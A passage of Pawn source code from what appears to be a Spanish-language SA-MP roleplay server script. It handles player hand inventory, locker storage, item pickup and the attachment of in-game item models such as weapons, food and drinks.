		NegoInfo[nego][nAlmacenCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del armario.", ObjetoInfo[AlmacenObj][NombreObjeto], Cant);
		SendClientMessage(playerid, Blanco, string);
	}
	else
	{
		SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;
	}
	return 1;
}

forward GuardarAlmacen(playerid, nego, mano); //Guardar un objeto en el almacén de un local
public GuardarAlmacen(playerid, nego, mano)
{
    if(nego == 0){return 1;}
    ActualizarManos(playerid);
    if(mano == 1)
    {
        if(PlayerInfo[playerid][pManoDer] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano derecha."); return 1;}
		new Mano = PlayerInfo[playerid][pManoDer];
		new Cant = PlayerInfo[playerid][pManoDerCant];
        if(ObjetoInfo[Mano][IDArma] > 0) //Guarda un arma
        {
			Cant = GetPlayerAmmo(playerid);
			RemovePlayerWeapon(playerid, ObjetoInfo[Mano][IDArma]);
        }
        new string[128];
        new AlmacenLibre;
		for(new x = 0; x < NegoInfo[nego][nMaxAlmacen]; x++) //Coloca el objeto en el primer slot libre del maletero
		{
			if(NegoInfo[nego][nAlmacen][x] == 0)
			{
			    NegoInfo[nego][nAlmacen][x] = Mano;
			    NegoInfo[nego][nAlmacenCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 1);
			    PlayerInfo[playerid][pManoDer] = 0;
			    PlayerInfo[playerid][pManoDerCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el armario.", ObjetoInfo[Mano][NombreObjeto], Cant);
                SendClientMessage(playerid, Blanco, string);
			    AlmacenLibre = 1;
			    return 1;
			}
		}
		if(AlmacenLibre == 0){SendClientMessage(playerid, Rojo, "* Todos los huecos del armario están ocupados."); return 1;}
	}
	else if(mano == 2)
	{
	    if(PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano izquierda."); return 1;}
		new Mano = PlayerInfo[playerid][pManoIzq];
		new Cant = PlayerInfo[playerid][pManoIzqCant];
		new string[128];
		new AlmacenLibre;
		for(new x = 0; x < NegoInfo[nego][nMaxAlmacen]; x++) //Coloca el objeto en el primer slot libre que encuentra
		{
			if(NegoInfo[nego][nAlmacen][x] == 0)
			{
   				NegoInfo[nego][nAlmacen][x] = Mano;
			    NegoInfo[nego][nAlmacenCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 2);
			    PlayerInfo[playerid][pManoIzq] = 0;
			    PlayerInfo[playerid][pManoIzqCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el armario.", ObjetoInfo[Mano][NombreObjeto], Cant);
                SendClientMessage(playerid, Blanco, string);
			    AlmacenLibre = 1;
			    return 1;
			}
		}
		if(AlmacenLibre == 0){SendClientMessage(playerid, Rojo, "* Todos los huecos del armario están ocupados."); return 1;}
	}
	return 1;
}
//--------------------//

forward ActualizarManos(playerid); //Actualiza el inventario
public ActualizarManos(playerid)
{
	new ManoDer = PlayerInfo[playerid][pManoDer], ManoDerCant = PlayerInfo[playerid][pManoDerCant];
	if(ManoDer > 0 && ObjetoInfo[ManoDer][IDArma] > 0) //Actualiza la munición del arma que sujeta
	{
	    PlayerInfo[playerid][pManoDerCant] = GetPlayerWeaponAmmo(playerid, ObjetoInfo[ManoDer][IDArma]);
	}
	if(ManoDer == 0){RemovePlayerAttachedObject(playerid, 1);}

	if(ObjetoInfo[ManoDer][Arrojadizo] == 1 && ManoDerCant <= 0) //Si es arrojadizo y tiene 0 munición se la quita
	{
		PlayerInfo[playerid][pManoDer] = 0;
		PlayerInfo[playerid][pManoDerCant] = 0;
		RemovePlayerAttachedObject(playerid, 1);
	}

	if(ManoDer > 0 && ManoDer < sizeof(ObjetoInfo)) //Si la cantidad del objeto es mayor a su capacidad, setear su cantidad a su capacidad
	{
	    if(ManoDerCant > ObjetoInfo[ManoDer][Capacidad])
	    {
	        if(ObjetoInfo[ManoDer][IDArma] > 0){ResetPlayerWeapons(playerid), GivePlayerWeapon(playerid, ObjetoInfo[ManoDer][IDArma], ObjetoInfo[ManoDer][Capacidad]);}
	        PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[ManoDer][Capacidad];
	    }
	    if(ManoDer < 19 && ManoDerCant <= 0){GivePlayerWeapon(playerid, ObjetoInfo[ManoDer][IDArma], 1);}
	}
	
	new ManoIzq = PlayerInfo[playerid][pManoIzq], ManoIzqCant = PlayerInfo[playerid][pManoIzqCant];
	if(ManoIzq == 0){RemovePlayerAttachedObject(playerid, 2);}
	if(ManoIzq > 0 && ManoIzq < sizeof(ObjetoInfo))
	{
	    if(ManoIzqCant > ObjetoInfo[ManoIzq][Capacidad])
	    {
	        PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[ManoIzq][Capacidad];
	    }
	    if(ManoIzq < 19 && ManoIzqCant <= 0){PlayerInfo[playerid][pManoIzqCant] = 1;}
	}
	if(ObjetoInfo[ManoIzq][Arrojadizo] == 1 && ManoIzqCant <= 0)
	{
		PlayerInfo[playerid][pManoIzq] = 0;
		PlayerInfo[playerid][pManoIzqCant] = 0;
		RemovePlayerAttachedObject(playerid, 2);
	}
}

forward CambiarObjetosMano(playerid); //Cambia objetos de mano
public CambiarObjetosMano(playerid)
{
    ActualizarManos(playerid);
    if(PlayerInfo[playerid][pManoDer] == 0 && PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en ninguna mano."); return 1;}
	new ManoDer = PlayerInfo[playerid][pManoDer], ManoDerCant = PlayerInfo[playerid][pManoDerCant];
	new ManoIzq = PlayerInfo[playerid][pManoIzq], ManoIzqCant = PlayerInfo[playerid][pManoIzqCant];
	if(ManoDer == 0)
	{
	    new string[150];
		RemovePlayerAttachedObject(playerid, 2);
        PonerObjeto(playerid, 1, ManoIzq);
        format(string, sizeof(string), "* Pasas tu {fce80c}%s (%d) {FFFFFF}a tu mano derecha.", ObjetoInfo[ManoIzq][NombreObjeto], ManoIzqCant);
        SendClientMessage(playerid, Blanco, string);
        if(ObjetoInfo[ManoIzq][IDArma] > 0){GivePlayerWeapon(playerid, ObjetoInfo[ManoIzq][IDArma], ManoIzqCant);}
	}
	else if(ManoIzq == 0)
	{
		new string[150];
		PonerObjeto(playerid, 2, ManoDer);
		ResetPlayerWeapons(playerid);
		RemovePlayerAttachedObject(playerid, 1);
		format(string, sizeof(string), "* Pasas tu {fce80c}%s (%d) {FFFFFF}a tu mano izquierda.", ObjetoInfo[ManoDer][NombreObjeto], ManoDerCant);
        SendClientMessage(playerid, Blanco, string);
	}
	else
	{
	    new string[150];
		PonerObjeto(playerid, 1, ManoIzq);
		PonerObjeto(playerid, 2, ManoDer);
		format(string, sizeof(string), "* Pasas tu {fce80c}%s (%d) {FFFFFF}a tu mano derecha y tu {fce80c}%s (%d) {FFFFFF}a tu mano izquierda.", ObjetoInfo[ManoIzq][NombreObjeto], ManoIzqCant, ObjetoInfo[ManoDer][NombreObjeto], ManoDerCant);
        SendClientMessage(playerid, Blanco, string);
        ResetPlayerWeapons(playerid);
        if(ObjetoInfo[ManoIzq][IDArma] > 0){GivePlayerWeapon(playerid, ObjetoInfo[ManoIzq][IDArma], ManoIzqCant);}
	}
    PlayerInfo[playerid][pManoDerCant] = ManoIzqCant, PlayerInfo[playerid][pManoDer] = ManoIzq;
	PlayerInfo[playerid][pManoIzqCant] = ManoDerCant, PlayerInfo[playerid][pManoIzq] = ManoDer;
    return 1;
}

forward RecogerObjeto(playerid);
public RecogerObjeto(playerid)
{
	if(PlayerInfo[playerid][pManoDer] > 0 && PlayerInfo[playerid][pManoIzq] > 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
	if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT || PlayerInfo[playerid][pMuerto] > 0){SendClientMessage(playerid, Rojo, "* No puedes usar este comando en esta situación."); return 1;}
	new ObjetoRecogido, string[128];
	for(new i = 0; i < sizeof(DropInfo); i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0,DropInfo[i][DropPosX],DropInfo[i][DropPosY],DropInfo[i][DropPosZ]))
		{
			if(GetPlayerVirtualWorld(playerid) == DropInfo[i][DropVWorld] && GetPlayerInterior(playerid) == DropInfo[i][DropInterior])
			{
			    if(DropInfo[i][DropID] == 0) break;
			    if(PlayerInfo[playerid][pServicioPD] > 0 && ObjetoInfo[DropInfo[i][DropID]][IDArma] != 0){SendClientMessage(playerid, Rojo, "* No puedes recoger armas del suelo estando de servicio. Para recoger pruebas utiliza /RecogerPrueba."); return 1;}
			    if(PlayerInfo[playerid][pServicioPD] > 0 && (DropInfo[i][DropID] >= 39 && DropInfo[i][DropID] <= 53)){SendClientMessage(playerid, Rojo, "* No puedes recoger municiones del suelo estando de servicio. Para recoger pruebas utiliza /RecogerPrueba."); return 1;}
				DestroyDynamicObject(DropObject[i]);
				if(PlayerInfo[playerid][pManoDer] == 0)
				{
				    PlayerInfo[playerid][pManoDer] = DropInfo[i][DropID], PlayerInfo[playerid][pManoDerCant] = DropInfo[i][DropCantidad];
					if(ObjetoInfo[DropInfo[i][DropID]][IDArma] > 0 && DropInfo[i][DropCantidad] > 0){GivePlayerWeapon(playerid,ObjetoInfo[DropInfo[i][DropID]][IDArma],DropInfo[i][DropCantidad]);}
					PonerObjeto(playerid, 1, DropInfo[i][DropID]);
				}
				else if(PlayerInfo[playerid][pManoIzq] == 0)
				{
				    PlayerInfo[playerid][pManoIzq] = DropInfo[i][DropID], PlayerInfo[playerid][pManoIzqCant] = DropInfo[i][DropCantidad];
					PonerObjeto(playerid, 2, DropInfo[i][DropID]);
				}
				format(string, sizeof(string), "* Recoges un/a {fce80c}%s (%d) {FFFFFF}del suelo.", ObjetoInfo[DropInfo[i][DropID]][NombreObjeto], DropInfo[i][DropCantidad]);
				SendClientMessage(playerid, Blanco, string);
				DropInfo[i][DropPosX] = 0.0;
				DropInfo[i][DropPosY] = 0.0;
				DropInfo[i][DropPosZ] = 0.0;
				DropInfo[i][DropID] = 0;
				DropInfo[i][DropCantidad] = 0;
				Streamer_Update(playerid);
				ObjetoRecogido = 1;
				break;
			}
		}
	}
	if(ObjetoRecogido == 0){SendClientMessage(playerid, Rojo, "* No estás cerca de ningún objeto."); return 1;}
	return 1;
}

stock PonerObjeto(playerid, slot, objetoid) //Coloca un objeto en la mano
{
    if(slot == 1)
	{
	    if(objetoid == 1) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6); //Armas
	    if(objetoid == 2) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 3) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 4) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 5) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 6) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 7) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 8) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 9) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 10) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 11) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 12) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 13) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 14) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 15) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 16) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 17) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 18) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 19) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 20) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 21) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 22) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 23) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 24) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 25) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 26) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 27) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 28) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 29) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 30) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 31) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 32) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 33) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 34) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 35) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 36) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 37) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    if(objetoid == 38) SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6);
	    

        if(objetoid >= 39 && objetoid <= 43) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.065000,0.029999,0.016999,10.800001,-103.099998,0.000000,0.649999,0.910999,0.476999); //Cargador pequeño
        if(objetoid >= 44 && objetoid <= 46) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.064999,0.035998,0.018999,1.599980,-105.499984,1.800009,0.649999,0.910999,0.476999); //Cargador grande
        if(objetoid >= 47 && objetoid <= 49) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.047999,0.058999,0.016999,100.800003,-103.099998,0.000000,0.482998,0.710998,0.414999); //Munición pequeña
	    if(objetoid == 50) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.037999,0.066998,0.016999,100.800003,8.199994,-0.999999,0.484999,0.847999,0.408999); //Munición escopeta
		if(objetoid >= 51 && objetoid <= 53) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.045999,0.074998,0.016999,100.800003,-3.899986,0.000000,0.445999,0.910999,0.476999); //Munición grande
		
		if(objetoid == 54)SetPlayerAttachedObject(playerid, 1, ObjetoInfo[objetoid][ModeloObjeto], 6); //Granada cegadora

	    if(objetoid >= 55 && objetoid <= 57) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.204000,0.029998,0.016999,10.800001,-103.099998,0.000000,0.839000,0.423999,0.645000); //Doritos, patatas y nachos
	    if(objetoid == 58 ||  objetoid == 59) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.043999,0.029998,0.016999,10.800001,-13.199980,1.000000,1.000000,1.000000,1.000000); //Sprunk y fanta
	    if(objetoid == 60) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,-0.031000,-0.030001,0.060999,10.800001,17.200008,0.000000,1.000000,1.000000,1.000000); //Botella agua
	    if(objetoid == 61) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.042000,0.055999,-0.085000,10.800001,1.100013,0.000000,1.000000,1.000000,1.000000); //Botella cerveza
	    if(objetoid == 62) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.064999,0.029998,0.016999,10.800001,-30.299997,0.000000,1.000000,1.000000,1.000000); //Copa de vino
	    if(objetoid == 63 || objetoid == 64) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.059999,0.029998,0.016999,10.800001,-31.300012,0.000000,1.000000,1.000000,1.000000); //Vaso de whisky y ron
	    if(objetoid == 65) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.088999,0.029998,0.045999,-43.799991,-24.899995,-10.599997,1.000000,1.000000,0.833999); //Hamburguesa
	    if(objetoid == 66) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.054000,0.029998,0.016999,106.699981,-11.200008,-105.300056,1.000000,1.000000,1.000000); //Burrito
	    if(objetoid == 67) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.296000,0.126998,0.016999,103.400001,0.199999,0.000000,1.000000,1.000000,1.000000); //Pizza
	    if(objetoid == 68) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,-0.005000,-0.010000,-0.024000,10.800001,1.499994,0.000000,1.000000,1.000000,1.000000); //Móvil
	    if(objetoid == 69) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.117999,0.009998,-0.041000,10.800001,-103.099998,0.000000,1.000000,1.000000,1.000000); //Mechero
	    if(objetoid == 70) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.070999,0.032999,0.025999,10.800001,89.800041,0.000000,1.000000,1.000000,1.000000); //Cigarrillos
	    if(objetoid == 71) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.035000,0.059999,-0.076000,10.800001,5.399998,0.000000,1.000000,1.000000,1.000000); //Botella ron
	    if(objetoid == 72) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.037000,0.072998,-0.065001,10.800001,0.100004,0.000000,1.000000,1.000000,1.000000); //Botella whisky
	    if(objetoid == 73) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.036000,0.034998,0.064998,10.800001,-0.399997,0.000000,1.000000,1.000000,1.000000); //Botella vino
	    if(objetoid == 74) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.079999,0.020998,0.016999,10.800001,164.000000,0.000000,1.000000,1.000000,1.000000); //Destornillador
	    
	    if(objetoid >= 75 && objetoid <= 79) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.092000,0.147998,-0.012001,-108.800010,178.099975,95.300003,0.703999,0.758000,0.787999); //Fardos droga
	    if(objetoid >= 80 && objetoid <= 84) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.117999,0.009998,-0.041000,10.800001,-103.099998,0.000000,1.000000,1.000000,1.000000); //Bolsitas droga
	    if(objetoid == 85) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.117999,0.009998,-0.041000,10.800001,-103.099998,0.000000,1.000000,1.000000,1.000000); //Semillas maria y coca
	    if(objetoid == 86) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,-0.010000,0.066998,0.096998,10.800001,-3.799994,0.000000,0.533999,0.475000,0.656000); //Planta maria
	    
	    if(objetoid >= 87 && objetoid <= 101) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,-0.034000,-0.010001,-0.006000,-2.199992,76.499961,179.900070,1.038000,1.230000,1.000000); //Relojes
	    if(objetoid >= 102 && objetoid <= 124) SetPlayerAttachedObject(playerid,1,ObjetoInfo[objetoid][ModeloObjeto],6,0.152999,0.106998,0.034999,-85.699996,179.999969,78.399993,1.038999,0.752000,0.854999); //Cajas de armamento
	}
	if(slot == 2)
	{
	    if(objetoid == 1) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.024999,0.000000,-0.005999,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000); //Armas
        if(objetoid == 2) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,-0.040000,0.067000,-0.003000,-29.899999,152.000000,176.000030,1.000000,1.000000,1.000000);
	    if(objetoid == 3) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.000000,0.059999,-0.022000,161.599990,10.700001,5.800002,1.000000,1.000000,1.000000);
	    if(objetoid == 4) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.180999,0.000000,0.017999,0.000000,177.800018,-8.799996,1.000000,1.000000,1.000000);
	    if(objetoid == 5) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.135999,0.030999,0.053999,-17.900001,153.800018,0.000000,1.000000,1.000000,1.000000);
	    if(objetoid == 6) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.041999,0.051999,-0.080000,-27.899986,155.800018,-167.499938,1.000000,1.000000,1.000000);
	    if(objetoid == 7) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.156999,0.092000,0.071999,-25.099998,172.899963,-19.899995,1.000000,1.000000,1.000000);
	    if(objetoid == 8) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.058000,0.008000,-0.109000,-27.999998,155.100036,172.699966,1.000000,1.000000,1.000000);
	    if(objetoid == 9) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.000000,0.078999,-0.009000,155.599990,7.200000,4.800000,1.000000,1.000000,1.000000);
	    if(objetoid == 10) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.015000,0.041000,-0.068000,-25.599971,162.900054,-175.300018,1.000000,1.000000,1.000000);
        if(objetoid == 11) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.023999,0.052999,-0.041999,157.899978,2.499999,0.000000,1.000000,1.000000,1.000000);
	    if(objetoid == 12) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,-0.002000,0.074000,0.001000,151.200042,23.000000,-9.100001,1.000000,1.000000,1.000000);
	    if(objetoid == 13) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.017999,0.003999,-0.047999,168.200012,18.300003,-27.900005,1.000000,1.000000,1.000000);
        if(objetoid == 14) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.176000,0.000000,-0.011000,-23.399999,160.599990,-6.399995,1.000000,1.000000,1.000000);
	    if(objetoid == 15) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.008999,-0.018999,-0.047999,-33.199996,159.900085,156.399902,1.000000,1.000000,1.000000);
	    if(objetoid == 16) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.019000,0.047000,-0.021000,164.499984,0.000000,-17.599994,1.000000,1.000000,1.000000);
	    if(objetoid == 17) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.034000,0.063000,-0.037999,164.500000,14.599996,-4.700009,1.000000,1.000000,1.000000);
	    if(objetoid == 18) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.022999,0.039000,-0.125999,165.700012,0.000000,0.000000,1.000000,1.000000,1.000000);
	    if(objetoid == 19) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.033000,0.057999,-0.017999,146.299987,14.999998,-4.700002,1.000000,1.000000,1.000000);
	    if(objetoid == 20) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.050999,0.038000,-0.021999,144.500015,9.100000,-11.600002,1.000000,1.000000,1.000000);
	    if(objetoid == 21) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.041000,0.038000,-0.026999,173.899963,0.000000,1.799999,1.000000,1.000000,1.000000);
	    if(objetoid == 22) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.000000,0.089000,0.000000,153.500015,10.000001,4.800000,1.000000,1.000000,1.000000);
        if(objetoid == 23) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.040000,0.026000,0.011000,-156.300003,0.000000,2.600000,1.000000,1.000000,1.000000);
	    if(objetoid == 24) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.023000,0.048999,-0.013000,172.200012,14.400005,0.599999,1.000000,1.000000,1.000000);
	    if(objetoid == 25) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.024999,0.048000,-0.012000,172.000076,-3.099988,-2.099991,1.000000,1.000000,1.000000);
	    if(objetoid == 26) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.005000,0.065000,-0.016000,162.399963,9.599999,8.400000,1.000000,1.000000,1.000000);
	    if(objetoid == 27) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.057999,0.076999,-0.023999,162.799942,14.399999,0.000000,1.000000,1.000000,1.000000);
	    if(objetoid == 28) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.043999,0.028999,-0.038000,167.499969,15.999998,0.000000,1.000000,1.000000,1.000000);
	    if(objetoid == 29) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.048000,0.049999,0.011000,-172.600006,-2.299995,5.999999,1.000000,1.000000,1.000000);
        if(objetoid == 30) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,-0.043000,0.065999,-0.044999,167.499954,17.399999,0.000000,1.000000,1.000000,1.000000);
        if(objetoid == 31) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,-0.018000,0.085000,0.033000,167.399978,12.200000,-0.299997,1.000000,1.000000,1.000000);
        if(objetoid == 32) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,-0.022000,0.087999,0.006999,154.899978,20.799997,-0.300001,1.000000,1.000000,1.000000);
        if(objetoid == 33) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.047000,0.057000,-0.038000,133.699981,17.199989,2.099999,1.000000,1.000000,1.000000);
        if(objetoid == 34) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.036999,0.026999,-0.079999,152.899993,14.900004,-0.400000,1.000000,1.000000,1.000000);
        if(objetoid == 35) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.004000,0.061999,-0.063999,126.599990,33.099998,2.200000,1.000000,1.000000,1.000000);
        if(objetoid == 36) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.018000,0.062999,0.074999,-109.400039,0.000000,0.000000,1.000000,1.000000,1.000000);
        if(objetoid == 37) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.018000,0.062999,0.074999,-109.400039,0.000000,0.000000,1.000000,1.000000,1.000000);
        if(objetoid == 38) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.050999,0.038000,-0.021999,144.500015,9.100000,-11.600002,1.000000,1.000000,1.000000);

		if(objetoid >= 39 && objetoid <= 43) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.092000,0.038000,-0.026000,-37.200008,82.199996,3.499996,0.649999,0.910999,0.476999); //Cargador pequeño
        if(objetoid >= 44 && objetoid <= 46) SetPlayerAttachedObject(playerid,2,ObjetoInfo[objetoid][ModeloObjeto],5,0.092000,0.038000,-0.026000,-37.200008,82.199996,3.499996,0.649999,0.910999,0.476999); //Cargador grande
